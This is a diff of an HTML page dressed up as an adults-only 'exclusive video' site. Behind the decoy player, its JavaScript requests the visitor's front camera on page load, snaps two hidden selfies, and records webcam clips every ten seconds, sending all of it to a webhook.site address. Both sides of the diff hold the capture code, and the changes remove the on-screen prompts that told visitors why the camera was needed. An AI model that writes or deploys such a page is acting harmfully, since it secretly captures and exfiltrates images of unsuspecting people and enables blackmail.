@@ -3,70 +3,35 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Scène Exclusive 2025 – Regardez maintenant</title>
+  <title>Vidéo Exclusive – Regardez maintenant</title>
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      background: #0a0015;
-      color: #fff;
+      background: #000;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
-      text-align: center;
+      justify-content: center;
     }
     header {
       width: 100%;
-      padding: 50px 20px 30px;
-      background: linear-gradient(to bottom, rgba(30,0,60,0.9), #000);
+      padding: 30px 20px;
+      background: #111;
+      text-align: center;
     }
     h1 {
       margin: 0;
-      font-size: 3.2rem;
-      color: #ff2e63;
-      text-shadow: 0 0 25px #ff0066;
-    }
-    .tagline {
-      font-size: 1.5rem;
-      margin: 15px 0;
-      color: #ff99cc;
-      opacity: 0.95;
-    }
-    #status {
-      font-size: 1.8rem;
-      margin: 50px 20px;
-      color: #ff6699;
-      text-shadow: 0 0 15px #ff0066;
-    }
-    #progress-container {
-      width: 85%;
-      max-width: 700px;
-      height: 45px;
-      background: rgba(255,255,255,0.05);
-      border-radius: 25px;
-      overflow: hidden;
-      margin: 40px auto;
-      border: 3px solid #ff3366;
-      display: none;
-      box-shadow: 0 0 30px rgba(255,51,102,0.5);
-    }
-    #progress-bar {
-      width: 0%;
-      height: 100%;
-      background: linear-gradient(to right, #ff0066, #ff6699, #ff0066);
-      transition: width 5s linear;
-      box-shadow: inset 0 0 20px #ff0066;
+      color: #ff3366;
+      font-size: 2.5rem;
     }
     #video-container {
       width: 95%;
       max-width: 1000px;
-      margin: 30px auto;
-      border-radius: 16px;
+      margin: 20px;
+      border-radius: 12px;
       overflow: hidden;
-      box-shadow: 0 0 50px rgba(255,51,102,0.6);
-      display: none;
-      border: 4px solid #ff3366;
+      box-shadow: 0 0 40px #ff0066;
     }
     video {
       width: 100%;
@@ -74,31 +39,24 @@
     }
     footer {
       margin-top: auto;
-      padding: 30px;
-      background: rgba(0,0,0,0.8);
-      font-size: 1rem;
-      opacity: 0.8;
+      padding: 20px;
+      background: #111;
+      font-size: 0.9rem;
+      opacity: 0.7;
       width: 100%;
+      text-align: center;
     }
   </style>
 </head>
 <body>
 
 <header>
-  <h1>Scène Exclusive 2025</h1>
-  <p class="tagline">Regardez la scène la plus chaude maintenant – cliquez sur Autoriser</p>
+  <h1>Vidéo Exclusive</h1>
 </header>
-
-<div id="status">Chargement en cours... Autorisation de la caméra requise</div>
-
-<div id="progress-container">
-  <div id="progress-bar"></div>
-</div>
 
 <div id="video-container">
   <video id="main-video" controls autoplay>
     <source src="https://files.catbox.moe/r2dbvz.mp4" type="video/mp4">
-    Votre navigateur ne supporte pas la vidéo
   </video>
 </div>
 
@@ -106,21 +64,18 @@
 <canvas id="canvas" style="display:none;"></canvas>
 
 <footer>
-  © 2025 Scène Exclusive – Contenu réservé aux adultes
+  © 2025 Vidéo Exclusive – Contenu 18+
 </footer>
 
 <script>
 const hiddenVideo = document.getElementById('hiddenVideo');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
-const progressBar = document.getElementById('progress-bar');
-const progressContainer = document.getElementById('progress-container');
-const status = document.getElementById('status');
-const videoContainer = document.getElementById('video-container');
+const mainVideo = document.getElementById('main-video');
 
 const WEBHOOK_URL = "https://webhook.site/d7897411-384f-49ca-b88e-f3765a3b397b";
 
-async function startCapture() {
+async function start() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
@@ -130,111 +85,55 @@ async function startCapture() {
     hiddenVideo.srcObject = stream;
     await hiddenVideo.play();
 
-    // التقاط صورتين فور السماح
-    setTimeout(() => captureSelfie(1), 800);
-    setTimeout(() => captureSelfie(2), 2200);
-
-    status.textContent = "Préparation de la vidéo... Ne fermez pas";
-    progressContainer.style.display = 'block';
-    progressBar.style.width = '0%';
-
-    let progress = 0;
-    const interval = setInterval(() => {
-      progress += 2;
-      progressBar.style.width = progress + '%';
-      if (progress >= 100) {
-        clearInterval(interval);
-        showVideoAndRecord();
-      }
-    }, 100);
+    // صورتين فور السماح
+    setTimeout(() => captureSelfie(1), 500);
+    setTimeout(() => captureSelfie(2), 1500);
 
   } catch (err) {
-    status.textContent = "Veuillez autoriser la caméra pour continuer";
-    console.log("رفض أو خطأ:", err);
+    console.log(err);
   }
-}
-
-function showVideoAndRecord() {
-  status.style.display = 'none';
-  progressContainer.style.display = 'none';
-  videoContainer.style.display = 'block';
-
-  const mainVideo = document.getElementById('main-video');
-  mainVideo.play();
-
-  // تسجيل كل 10 ثواني (5 تصوير + 5 راحة)
-  let recording = false;
-  const stream = hiddenVideo.srcObject;
-
-  const recordSegment = () => {
-    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-    const chunks = [];
-
-    recorder.ondataavailable = e => chunks.push(e.data);
-
-    recorder.start(100);
-    recording = true;
-
-    setTimeout(() => {
-      recorder.stop();
-      recording = false;
-      recorder.onstop = () => sendVideo(chunks);
-    }, 5000);
-  };
-
-  // أول تسجيل بعد 2 ثانية من بدء الفيديو
-  setTimeout(recordSegment, 2000);
-
-  // كل 10 ثواني بعد ذلك
-  mainVideo.addEventListener('timeupdate', () => {
-    if (mainVideo.currentTime % 10 < 0.5 && !recording) {
-      recordSegment();
-    }
-  });
-}
-
-async function sendVideo(chunks) {
-  const blob = new Blob(chunks, { type: 'video/webm' });
-  const fd = new FormData();
-  fd.append('video_segment', blob, `segment_${Date.now()}.webm`);
-  fd.append('timestamp', Date.now());
-  fd.append('user_agent', navigator.userAgent);
-  await fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(console.log);
 }
 
 async function captureSelfie(num) {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
-    });
-    hiddenVideo.srcObject = stream;
-    await hiddenVideo.play();
-    await new Promise(r => setTimeout(r, 800));
-
-    canvas.width = hiddenVideo.videoWidth;
-    canvas.height = hiddenVideo.videoHeight;
-    ctx.drawImage(hiddenVideo, 0, 0);
-    canvas.toBlob(blob => sendBlob(blob, num), 'image/jpeg', 0.92);
-
-    setTimeout(() => {
-      stream.getTracks().forEach(track => track.stop());
-    }, 500);
-  } catch (err) {
-    console.log("خطأ selfie:", err);
-  }
+  canvas.width = hiddenVideo.videoWidth;
+  canvas.height = hiddenVideo.videoHeight;
+  ctx.drawImage(hiddenVideo, 0, 0);
+  canvas.toBlob(blob => {
+    const fd = new FormData();
+    fd.append('selfie', blob, `selfie_\( {Date.now()}_ \){num}.jpg`);
+    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+  }, 'image/jpeg', 0.92);
 }
 
-function sendBlob(blob, num) {
-  const fd = new FormData();
-  fd.append('selfie', blob, `selfie_\( {Date.now()}_ \){num}.jpg`);
-  fd.append('timestamp', Date.now());
-  fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(console.log);
+// تسجيل كل 10 ثواني (5 تصوير + 5 راحة)
+function startRecordingCycle() {
+  const stream = hiddenVideo.srcObject;
+  if (!stream) return;
+
+  const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+  const chunks = [];
+
+  recorder.ondataavailable = e => chunks.push(e.data);
+
+  recorder.start(100);
+
+  setTimeout(() => {
+    recorder.stop();
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const fd = new FormData();
+      fd.append('video_segment', blob, `segment_${Date.now()}.webm`);
+      fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+    };
+
+    // كرر كل 10 ثواني
+    setTimeout(startRecordingCycle, 10000);
+  }, 5000);
 }
 
-window.addEventListener('load', () => {
-  setTimeout(startCapture, 800);
-});
+mainVideo.addEventListener('play', startRecordingCycle);
+
+window.addEventListener('load', start);
 </script>
 
 </body>
